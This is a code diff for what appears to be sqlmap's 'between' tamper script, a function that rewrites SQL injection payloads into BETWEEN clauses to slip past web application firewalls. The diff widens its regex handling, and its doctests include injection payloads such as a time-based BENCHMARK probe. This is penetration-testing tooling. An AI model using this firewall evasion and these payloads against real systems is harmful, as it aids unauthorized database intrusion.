@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
+Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
 See the file 'LICENSE' for copying permission
 """
 
@@ -16,19 +16,21 @@ def dependencies():
 
 def tamper(payload, **kwargs):
     """
-    Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' and equals operator ('=') with 'BETWEEN # AND #'
+    Replaces the greater-than operator (>) with NOT BETWEEN 0 AND # and the equal sign (=) with BETWEEN # AND #
 
     Tested against:
-        * Microsoft SQL Server 2005
-        * MySQL 4, 5.0 and 5.5
-        * Oracle 10g
-        * PostgreSQL 8.3, 8.4, 9.0
+        * MySQL 8.4.9
+        * MariaDB 11.8.8
+        * PostgreSQL 16.11
+        * SQLite 3.45.1
+        * Microsoft SQL Server 2022
+        * Oracle 23ai
 
     Notes:
         * Useful to bypass weak and bespoke web application firewalls that
           filter the greater than character
-        * The BETWEEN clause is SQL standard. Hence, this tamper script
-          should work against all (?) databases
+        * The BETWEEN clause is SQL standard, and the rewrite was confirmed
+          to run unchanged on every engine listed above
 
     >>> tamper('1 AND A > B--')
     '1 AND A NOT BETWEEN 0 AND B--'
@@ -36,24 +38,31 @@ def tamper(payload, **kwargs):
     '1 AND A BETWEEN B AND B--'
     >>> tamper('1 AND LAST_INSERT_ROWID()=LAST_INSERT_ROWID()')
     '1 AND LAST_INSERT_ROWID() BETWEEN LAST_INSERT_ROWID() AND LAST_INSERT_ROWID()'
+    >>> tamper('1 AND 2314=BENCHMARK(5000000,MD5(0x41))')
+    '1 AND 2314=BENCHMARK(5000000,MD5(0x41))'
+    >>> tamper('CASE WHEN 1=2 THEN id ELSE 0 END')
+    'CASE WHEN 1 BETWEEN 2 AND 2 THEN id ELSE 0 END'
     """
 
     retVal = payload
 
     if payload:
-        match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^>]+?)\s*>\s*([^>]+)\s*\Z", payload)
+        match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^>]+?)\s*(?<![<])>(?!=)\s*([^>]+)\s*\Z", payload)  # Note: avoiding compound operators (e.g. >=, <>)
 
         if match:
             _ = "%s %s NOT BETWEEN 0 AND %s" % (match.group(2), match.group(4), match.group(5))
             retVal = retVal.replace(match.group(0), _)
         else:
-            retVal = re.sub(r"\s*>\s*(\d+|'[^']+'|\w+\(\d+\))", r" NOT BETWEEN 0 AND \g<1>", payload)
+            retVal = re.sub(r"\s*(?<![<])>(?!=)\s*(\d+|'[^']+'|\w+\(\d+\))", r" NOT BETWEEN 0 AND \g<1>", payload)
 
         if retVal == payload:
-            match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^=]+?)\s*=\s*([\w()]+)\s*", payload)
+            match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^=]+?)\s*(?<![<>!])=(?!=)\s*([\w()]+)\s*", payload)  # Note: avoiding compound operators (e.g. >=, !=)
 
-            if match:
+            if match and match.group(5).count('(') == match.group(5).count(')'):  # Note: e.g. 'BENCHMARK(5000000,MD5(..))' can't be cut at its comma
                 _ = "%s %s BETWEEN %s AND %s" % (match.group(2), match.group(4), match.group(5), match.group(5))
                 retVal = retVal.replace(match.group(0), _)
+
+        # e.g. CASE WHEN 1=1 THEN ... (expression-position payloads with no AND/OR to anchor on)
+        retVal = re.sub(r"(?i)(\bWHEN\s+)([\w.]+)\s*(?<![<>!])=(?!=)\s*([\w.]+)(?=\s)", r"\g<1>\g<2> BETWEEN \g<3> AND \g<3>", retVal)
 
     return retVal
